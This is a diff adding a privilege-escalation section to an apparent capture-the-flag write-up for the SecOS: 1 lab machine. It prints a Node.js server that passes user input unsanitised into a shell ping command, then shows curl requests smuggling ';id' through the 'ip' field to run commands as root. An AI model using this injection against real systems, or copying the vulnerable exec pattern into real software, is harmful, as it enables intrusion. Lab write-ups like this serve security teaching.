@@ -207,6 +207,251 @@ GitHub : PaulSec
 
 ## Privilege Escalation Method 2
 
+Going in this directory wil show the source code of application :
+
+```bash
+spiderman@SecOS-1:~$ cd /home/spiderman/vnwa
+spiderman@SecOS-1:~/vnwa$ ls
+internalServer.js  lib  LICENSE  node_modules  package.json  public  scripts  server.js  views
+```
+
+look at `internalServer.js` file :
+
+```javascript
+spiderman@SecOS-1:~/vnwa$ cat internalServer.js 
+var fs = require('fs');
+var express = require('express');
+var http = require('http');
+var sys = require('sys')
+var exec = require('child_process').exec;
+var crypto = require('crypto');
+
+var utils = require('./lib/utils.js');
+var model = require('./lib/model.js');
+
+var app = express();
+var server = http.createServer(app); 
+
+var logger = function (req, res, next) {
+    console.log(req.connection.remoteAddress + " tried to access : " + req.url);
+    next(); // Passing the request to the next handler in the stack.
+}
+
+// Configuration
+app.configure(function () {
+    // Session management
+    app.use(express.cookieParser());
+    app.use(express.session({secret: 'privateKeyForSession'}));
+    app.use("/js", express.static(__dirname + '/public/js')); // javascript folder
+    app.use("/css", express.static(__dirname + '/public/css')); // javascript folder
+
+    app.set('views', __dirname + '/views'); // views folder
+    app.set('view engine', 'ejs'); // view engine for this projet : ejs 
+
+    app.use(express.bodyParser()); // for POST Requests
+    app.use(logger); // Here you add your logger to the stack.
+    app.use(app.router); // The Express routes handler.
+});
 
 
+app.get('/', function (req, res) {
+    res.render('ping.ejs', {
+        isConnected: req.session.isConnected,
+        isAdmin: req.session.isAdmin
+    });
+});
 
+// Update password
+app.post('/', function (req, res) {
+    ip = req.body.ip
+    if (ip == "") {
+        utils.redirect(req, res, '/ping-status');
+    } else {
+        // getting the command with req.params.command
+        var child;
+        // console.log(req.params.command);
+        child = exec('ping ' + ip, function (error, stdout, stderr) {
+            res.render('ping.ejs', {
+                isConnected: req.session.isConnected,
+                message: stdout,
+                isAdmin: req.session.isAdmin
+            });
+        });
+    }
+});
+
+server.listen(9000, '127.0.0.1', function() {
+  console.log("Listening on port 9000");
+});
+```
+
+we see here that the application is using some kind of ping here command here and is listening on port 9000
+
+i check if this port is actually listening on the server :
+
+```bash
+spiderman@SecOS-1:~/vnwa$ netstat -plnt
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:8081            0.0.0.0:*               LISTEN      1293/node       
+tcp        0      0 127.0.0.1:28017         0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+```
+
+yes it is, all we need to do is to check wether it works as we think or not, so i tried to use `curl` to check its functionality :
+
+```bash
+spiderman@SecOS-1:~/vnwa$ curl --data 'ip=127.0.0.1 -c 1' 127.0.0.1:9000
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <!-- <link rel="shortcut icon" href="../../assets/ico/favicon.ico"> -->
+
+    <title>Internal Web App</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap theme -->
+    <link href="/css/bootstrap-theme.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="/css/theme.css" rel="stylesheet">
+    <link href="/css/theme-secure-web-app.css" rel="stylesheet">
+  </head>
+
+  <body role="document">
+
+    <!-- Fixed navbar -->
+    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+          </button>
+          <a class="navbar-brand" href="/">Internal admin tools</a>
+        </div>
+        <div class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+          </ul>
+        </div><!--/.nav-collapse -->
+      </div>
+    </div>
+
+    <div class="container">
+      <form class="form-signin" action="/" method="POST">
+        <h4 class="form-signin-heading">Enter the IP you want to ping</h4>
+        <input type="text" class="input-block-level" placeholder="127.0.0.1" name="ip"><br />
+        <button class="btn btn-large btn-primary" type="submit">Ping !</button>
+      </form>
+
+        
+        <div class="panel panel-default">
+            <div class="panel-heading">
+                <h3 class="panel-title">Ping result</h3>
+            </div>
+            <div class="panel-body">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.033 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.033/0.033/0.033/0.000 ms
+</div>
+        </div>
+        
+
+    </div> <!-- /container -->
+
+  </body>
+</html>
+```
+
+yes it works so lets try using some command injection with `;` and `id` command :
+
+```bash
+spiderman@SecOS-1:~/vnwa$ curl --data 'ip=127.0.0.1 -c 1;id' 127.0.0.1:9000
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <!-- <link rel="shortcut icon" href="../../assets/ico/favicon.ico"> -->
+
+    <title>Internal Web App</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap theme -->
+    <link href="/css/bootstrap-theme.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="/css/theme.css" rel="stylesheet">
+    <link href="/css/theme-secure-web-app.css" rel="stylesheet">
+  </head>
+
+  <body role="document">
+
+    <!-- Fixed navbar -->
+    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+          </button>
+          <a class="navbar-brand" href="/">Internal admin tools</a>
+        </div>
+        <div class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+          </ul>
+        </div><!--/.nav-collapse -->
+      </div>
+    </div>
+
+    <div class="container">
+      <form class="form-signin" action="/" method="POST">
+        <h4 class="form-signin-heading">Enter the IP you want to ping</h4>
+        <input type="text" class="input-block-level" placeholder="127.0.0.1" name="ip"><br />
+        <button class="btn btn-large btn-primary" type="submit">Ping !</button>
+      </form>
+
+        
+        <div class="panel panel-default">
+            <div class="panel-heading">
+                <h3 class="panel-title">Ping result</h3>
+            </div>
+            <div class="panel-body">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.016 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.016/0.016/0.016/0.000 ms
+uid=0(root) gid=0(root) groups=0(root)
+</div>
+        </div>
+        
+
+    </div> <!-- /container -->
+
+  </body>
+</html>
+```
+
+you can see from the result that our `id` command worked and it shows `root` id.
+
+now we can print the content of `/root/flag.txt` or gain a reverse shell and cat the content.
+
+this is how you can root the `SecOS: 1` machine :)
